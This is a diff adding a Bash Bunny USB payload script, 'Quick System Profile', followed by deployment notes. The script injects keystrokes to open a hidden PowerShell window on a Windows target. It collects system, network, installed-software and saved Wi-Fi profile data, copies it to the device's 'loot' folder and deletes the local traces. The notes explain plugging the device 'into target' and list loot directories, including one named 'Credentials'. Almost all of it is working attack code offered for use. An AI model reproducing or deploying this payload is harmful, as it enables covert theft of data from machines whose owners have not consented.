@@ -1,0 +1,63 @@
+#!/bin/bash
+#
+# Title:         Quick System Profile
+# Description:   Fast system information gathering (30 seconds)
+# Author:        Jon-Eric Pienkowski ~ Pacific NW Computers
+# Version:       1.0
+# Category:      Recon
+# Target:        Windows 10/11
+# Attackmodes:   HID, Storage
+#
+# LED Status:
+# - Magenta: Setup
+# - Yellow: Collecting
+# - Green: Complete
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+
+LOOT_DIR=/root/udisk/loot/QuickProfile_$(date +%Y%m%d_%H%M%S)
+mkdir -p $LOOT_DIR
+
+sleep 3
+
+LED ATTACK
+
+RUN WIN powershell -WindowStyle Hidden -NoProfile
+Q DELAY 2500
+
+# One-liner data collection
+Q STRING \$l=\$env:TEMP+'\\QP_'+(Get-Date -F 'yyyyMMdd_HHmmss')\;ni -ItemType Directory \$l -F\>nul\;"PC:\$env:COMPUTERNAME``nUser:\$env:USERNAME``nDate:\$(Get-Date)"\>\$l\\info.txt\;systeminfo\>\$l\\system.txt\;ipconfig /all\>\$l\\network.txt\;Get-WmiObject Win32_Product\|Select Name,Version\>\$l\\software.txt\;netsh wlan show profiles\>\$l\\wifi.txt\;\$bb=(Get-Volume\|?{(\$_.FileSystemLabel -like '*BASHBUNNY*')})[0].DriveLetter\;if(\$bb){cp -Path \$l -Dest "\$bb`:\\loot\\" -R -F}\;rm -Path \$l -R -F -EA 0\;exit
+Q ENTER
+Q DELAY 30000
+
+LED FINISH
+sync
+```
+
+## Deployment Instructions
+
+### Switch 1: Full Migration Data Collection
+1. Copy first payload to `/payloads/switch1/payload.txt`
+2. Set switch to position 1
+3. Plug into target - collects comprehensive migration data
+
+### Switch 2: Network Reconnaissance
+1. Copy second payload to `/payloads/switch2/payload.txt`
+2. Set switch to position 2
+3. Plug into target - performs network scan
+
+### Library Payloads
+- Store additional payloads in `/payloads/library/`
+- Copy to switch folder when needed
+
+## Retrieved Data Location
+
+All data is automatically copied to:
+```
+/root/udisk/loot/
+├── Migration_COMPUTERNAME_20241229_120000/
+├── NetRecon_COMPUTERNAME_20241229_130000/
+├── Credentials_COMPUTERNAME_20241229_140000/
+└── QuickProfile_COMPUTERNAME_20241229_150000/
